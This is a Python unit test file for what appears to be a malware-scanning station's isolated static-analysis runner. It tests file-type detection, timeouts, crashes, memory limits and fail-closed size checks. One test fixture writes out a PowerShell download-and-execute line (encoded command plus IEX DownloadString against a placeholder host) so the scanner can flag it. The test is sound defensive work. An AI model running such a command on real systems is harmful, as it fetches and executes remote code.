"""Unit tests for isolated static runner and timeout/fault injection."""

import subprocess
from pathlib import Path
from typing import Any
from unittest.mock import patch

import pytest

from sentinel.scan.static_runner import IsolatedStaticRunner


def test_isolated_pe_analysis(tmp_path: Path) -> None:
    pe_file = tmp_path / "sample.exe"
    # Write minimal fake MZ header
    data = bytearray(b"MZ" + b"\x00" * 200)
    pe_file.write_bytes(data)

    runner = IsolatedStaticRunner(timeout_s=5.0)
    res = runner.run_analysis(pe_file, original_filename="sample.exe", tool="all")

    assert res.status == "success"
    assert res.detected_type == "pe"
    assert not res.ext_mismatch


def test_isolated_script_analysis_detects_obfuscation(tmp_path: Path) -> None:
    ps_file = tmp_path / "script.ps1"
    ps_file.write_text(
        "powershell -encodedcommand AAAA ; IEX (New-Object Net.WebClient).DownloadString('http://x')"
    )

    runner = IsolatedStaticRunner(timeout_s=5.0)
    res = runner.run_analysis(ps_file, original_filename="script.ps1", tool="all")

    assert res.status == "success"
    assert res.detected_type == "script"
    assert "script_detected" in res.flags
    assert "powershell_iex" in res.flags or "powershell_encoded" in res.flags


def test_isolated_parser_timeout_fault_injection(tmp_path: Path) -> None:
    """Fault Injection: A hanging parser must be terminated at timeout threshold without crashing host."""
    test_file = tmp_path / "hang_trigger.bin"
    test_file.write_bytes(b"dummy")

    # Set ultra-short timeout and mock subprocess.run to raise TimeoutExpired
    runner = IsolatedStaticRunner(timeout_s=0.01)

    with patch("subprocess.run", side_effect=subprocess.TimeoutExpired(cmd="test", timeout=0.01)):
        res = runner.run_analysis(test_file, original_filename="hang.bin")
        assert res.status == "timeout"
        assert "static_analysis_timeout" in res.flags
        assert "timed out" in (res.error_message or "")


def test_isolated_parser_crash_fault_injection(tmp_path: Path) -> None:
    """Fault Injection: A crashing parser (non-zero return code) must be trapped safely."""
    test_file = tmp_path / "crash_trigger.bin"
    test_file.write_bytes(b"dummy")

    runner = IsolatedStaticRunner(timeout_s=5.0)

    # Simulate worker process segfault or non-zero exit code
    mock_proc = subprocess.CompletedProcess(
        args=["mock"],
        returncode=139,  # SIGSEGV
        stdout="",
        stderr="Fatal error: Segmentation fault in native parser library",
    )

    with patch("subprocess.run", return_value=mock_proc):
        res = runner.run_analysis(test_file, original_filename="crash.bin")
        assert res.status == "error"
        assert "static_analysis_crash" in res.flags
        assert "Segmentation fault" in (res.error_message or "")


def test_isolated_parser_setrlimit_memory_exhaustion(tmp_path: Path) -> None:
    """Linux setrlimit: RLIMIT_AS strictly kills memory-hungry worker without crashing station."""
    import sys
    if not sys.platform.startswith("linux"):
        pytest.skip("setrlimit memory enforcement is Linux-specific")

    test_file = tmp_path / "mem_hog.bin"
    test_file.write_bytes(b"dummy")

    # Tight 64MB memory limit
    runner = IsolatedStaticRunner(timeout_s=5.0, mem_limit_bytes=64 * 1024 * 1024)

    # Command that deliberately exhausts memory beyond 64MB
    orig_cmd = [sys.executable, "-c", "bytearray(128 * 1024 * 1024)"]

    with patch("sentinel.scan.static_runner.subprocess.run", wraps=subprocess.run) as mock_run:
        def patched_run(cmd: Any, **kwargs: Any) -> Any:
            return mock_run(orig_cmd, **kwargs)

        with patch("subprocess.run", side_effect=patched_run):
            res = runner.run_analysis(test_file, original_filename="mem_hog.bin")

    assert res.status == "error"
    assert "static_analysis_crash" in res.flags
    assert "MemoryError" in (res.error_message or "") or "crashed" in (res.error_message or "")


def test_static_analysis_skipped_when_size_exceeds_config_limit(tmp_path: Path) -> None:
    """Requirement 3.e: Files exceeding max_static_analysis_mb skip static analysis and fail closed."""
    from sentinel.scan.clamav import MockClamAvScanner
    from sentinel.scan.engine import ScanEngine
    from sentinel.scan.yara_scanner import MockYaraScanner
    from sentinel.util.config import PolicyConfig, ScanConfig, SentinelConfig

    cfg = SentinelConfig(
        mode="laptop_mock",
        scan=ScanConfig(
            max_file_mb=100,
            max_static_analysis_mb=1,  # 1 MB threshold
        ),
    )
    pol_cfg = PolicyConfig()

    mount_dir = tmp_path / "mount"
    mount_dir.mkdir()
    large_file = mount_dir / "large_document.pdf"
    # Write 2 MB file (exceeding 1 MB limit)
    large_file.write_bytes(b"%PDF-" + b"A" * (2 * 1024 * 1024))

    engine = ScanEngine(
        config=cfg,
        policy_config=pol_cfg,
        clamav_scanner=MockClamAvScanner(),
        yara_scanner=MockYaraScanner(),
    )

    result = engine.scan_mount(mount_dir)
    assert result.scan_complete is False
    assert any("static_analysis_size_exceeded" in f.flags for f in result.file_features)
    assert any("exceeds maximum static analysis limit" in r for r in result.deterministic_reasons)
    # File is never considered clean
    assert result.deterministic_risk >= 0.75
